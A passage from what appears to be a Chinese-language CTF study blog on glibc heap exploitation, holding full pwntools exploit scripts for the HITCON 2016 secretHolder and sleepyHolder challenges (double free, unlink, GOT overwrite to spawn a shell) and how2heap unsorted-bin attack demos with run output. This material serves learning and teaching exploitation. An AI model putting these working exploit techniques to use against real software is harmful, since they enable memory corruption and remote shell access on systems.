class="hljs-string">&#x27;./secretHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># double free:free chunk_2</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)     <span class="hljs-comment"># chunk_1,chunk_2 overlapping</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">3</span>)<span class="hljs-comment"># change mp_.mmap_threshold</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)<br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>) + p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)<br>fake_chunk += p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x61A90</span>)<br>renew(<span class="hljs-number">2</span>, fake_chunk)<br>wipe(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="hitcon-2016-sleepyHolder"><a href="#hitcon-2016-sleepyHolder" class="headerlink" title="hitcon_2016_sleepyHolder"></a>hitcon_2016_sleepyHolder</h4><p>与上一道题目非常相似，但是<code>huge</code>堆块一旦分配了就无法再释放，利用难度陡增。这里同样是利用了<code>fastbin_dump_consolidate</code>方法来制造堆块重叠，与此同时，这里也存在<code>double free</code>。</p><p><strong>这里我们分配的<code>small</code>堆块为0x28，实际上是存在<code>presize</code>的复用，利用这点我们可以修改堆块头，但是如何修改下一个堆块的<code>size</code>标记位？需要注意的是，不管是在malloc还是free操作的时候，对于fastbin，是不会修改其下一个堆块的标志位的，我们可以利用<code>consolidate</code>将<code>samll</code>堆块放入unsortedbin中，并且利用<code>double free</code>再次将<code>small</code>链入fastbin中，这样我们再次申请<code>small</code>堆块的时候就成功修改其下一个堆块的标志位。</strong></p><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>sh = process(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br><span class="hljs-comment"># sh = remote(&quot;node4.buuoj.cn&quot;, 28881)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>elf = ELF(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>small_ptr_addr = <span class="hljs-number">0x6020D0</span><br>big_ptr_addr = <span class="hljs-number">0x6020C0</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> == <span class="hljs-number">3</span> :<br>        sdla(<span class="hljs-string">&#x27;3. Keep a huge secret and lock it forever&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    <br>    <span class="hljs-keyword">else</span> :<br>        sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>sdla(<span class="hljs-string">&quot;Waking Sleepy Holder up ...&quot;</span>, <span class="hljs-string">b&#x27;zyy&#x27;</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)    <span class="hljs-comment"># consolidate</span><br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># link to fastbin</span><br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_size</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_fd</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_bk</span><br>fake_chunk += p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_presize</span><br>keep(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><span class="hljs-comment"># str_bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h3><p>在libc的源码里面我们看到malloc函数在寻找unsortedbin中的chunk的时候，由于unsortedbin的规则是<code>FIFO</code>，即先进先出，malloc首先会找到unsortedbin里存放的bk指针，找到最开始链入的chunk，也就是链里最后的chunk，如果我们能够修改该堆块的头和内容，那么其bk所指向的就有可能是我们伪造的fake_chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><span class="hljs-comment">// 再次请求防止victim与top chunk合并</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br><br><span class="hljs-built_in">free</span>(victim);<br><br><br><span class="hljs-comment">// 在栈上伪造一个chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br><span class="hljs-comment">// size设置成下一个请求的大小，bk指针指向任何一个可写的地址</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br><br>stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<span class="hljs-comment">// 包含chunk的头部</span><br><br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<span class="hljs-comment">// bk指针指向自己</span><br><br><br><br><span class="hljs-comment">//------------VULNERABILITY-----------</span><br><span class="hljs-comment">// 存在一个漏洞修改victim的size和bk指针</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br><span class="hljs-comment">// size必须和请求的size不同，使得我们能够返回fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br><br>victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<span class="hljs-comment">// 修改size</span><br><br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br><span class="hljs-comment">//------------------------------------</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br><br><span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><span class="hljs-comment">// 这时候返回的就是我们所需要的chunk</span><br><br><br><span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br><span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br><br><br>assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_into_stack<br>Allocating the victim chunk<br>Allocating another chunk to avoid consolidating the top chunk with the small one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br>Freeing the chunk 0x1227420, it will be inserted in the unsorted bin<br>Create a fake chunk on the stackSet size <span class="hljs-keyword">for</span> next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer<br>Size should be different from the next request size to <span class="hljs-keyword">return</span> fake_chunk and need to pass the check 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;system_mem<br>Now next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk: 0x7ffd067c2390<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x100</span>)</span>: 0x7ffd067c2390<br>Nice jump d00d<br></code></pre></td></tr></table></figure><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><p>由于unsortedbin取出堆块的时候，会将其bk所指向的堆块写入当前unsorted的bk指针，同时会将该unsortedbin中的fd指针写入下一个堆块的fd指针区域，使得目标地址里写入了超大的值（unsortedbin的fd的值），如下：</p><ul><li><code>victim = unsorted_chunks(av)-&gt;bk</code></li><li><code>bck = victim-&gt;bk = p-&gt;bk = target_addr-16</code></li><li><code>unsorted_chunks(av)-&gt;bk = bck = target_addr-16</code></li><li><code>bck-&gt;fd = *(target_addr -16+16) = unsorted_chunks(av);</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);<br><span class="hljs-comment">// 该攻击方法可以向栈里写入一个很大的无符号值</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><br>   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><span class="hljs-comment">// 主要用于辅助其他的攻击手段</span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br><br><br><span class="hljs-built_in">free</span>(p);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><br>   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br><br><br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<span class="hljs-comment">// 修改bk指针指向栈上的地址</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//------------------------------------</span><br><br><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br><br>   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_attack<br>This file demonstrates unsorted bin attack by write a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, unsorted bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span 